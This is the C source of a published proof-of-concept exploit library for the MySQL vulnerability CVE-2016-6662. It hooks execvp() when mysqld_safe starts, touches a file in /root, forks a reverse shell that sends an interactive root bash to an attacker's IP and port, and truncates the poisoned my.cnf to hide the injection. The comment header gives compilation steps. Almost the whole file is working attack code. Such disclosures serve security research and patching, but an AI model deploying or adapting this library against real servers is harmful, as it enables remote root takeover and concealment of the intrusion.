/*

(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit
mysql_hookandroot_lib.c

This is the shared library injected by 0ldSQL_MySQL_RCE_exploit.py exploit.
The library is meant to be loaded by mysqld_safe on mysqld daemon startup
to create a reverse shell that connects back to the attacker's host on
6603 port (mysql port in reverse ;) and provides a root shell on the
target.

mysqld_safe will load this library through the following setting:

[mysqld]
malloc_lib=mysql_hookandroot_lib.so

in one of the my.cnf config files (e.g. /etc/my.cnf).

This shared library will hook the execvp() function which is called
during the startup of mysqld process.
It will then fork a reverse shell and clean up the poisoned my.cnf
file in order to let mysqld run as normal so that:
'service mysql restart' will work without a problem.

Before compiling adjust IP / PORT and config path.


~~
Discovered/Coded by:

Dawid Golunski
http://legalhackers.com


~~
Compilation (remember to choose settings compatible with the remote OS/arch):

gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl

Disclaimer:

For testing purposes only. Do no harm.

Full advisory URL:
http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKERS_IP "127.0.0.1"
#define SHELL_PORT 6033
#define INJECTED_CONF "/var/lib/mysql/my.cnf"

char* env_list[] = { "HOME=/root", NULL };
typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);
static execvp_func_t old_execvp = NULL;


// fork & send a bash shell to the attacker before starting mysqld
void reverse_shell(void) {

    int i; int sockfd;
    //socklen_t socklen;
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons( SHELL_PORT ); // connect-back port
    srv_addr.sin_addr.s_addr = inet_addr(ATTACKERS_IP); // connect-back ip

    // create new TCP socket && connect
    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
    connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

    for (i = 0; i <= 2; i++) dup2(sockfd, i);
    execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );

    exit(0);
}


/*
 cleanup injected data from the target config before it is read by mysqld
 in order to ensure clean startup of the service

 The injection (if done via logging) will start with a line like this:

 /usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:

*/

int config_cleanup() {

    FILE *conf;
    char buffer[2000];
    long cut_offset = 0;

    conf = fopen(INJECTED_CONF, "r+");
    if (!conf) return 1;

    while (!feof(conf)) {
        fgets(buffer, sizeof(buffer), conf);
        if (strstr(buffer, "/usr/sbin/mysqld, Version")) {
            cut_offset = (ftell(conf) - strlen(buffer));
        }

    }
    if (cut_offset > 0) ftruncate(fileno(conf), cut_offset);
    fclose(conf);
    return 0;

}


// execvp() hook
int execvp(const char* filename, char* const argv[]) {

    pid_t  pid;
    int fd;

    // Simple root PoC (touch /root/root_via_mysql)
    fd = open("/root/root_via_mysql", O_CREAT);
    close(fd);

    old_execvp = dlsym(RTLD_NEXT, "execvp");

    // Fork a reverse shell and execute the original execvp() function
    pid = fork();
    if (pid == 0)
        reverse_shell();

    // clean injected payload before mysqld is started
    config_cleanup();
    return old_execvp(filename, argv);
}
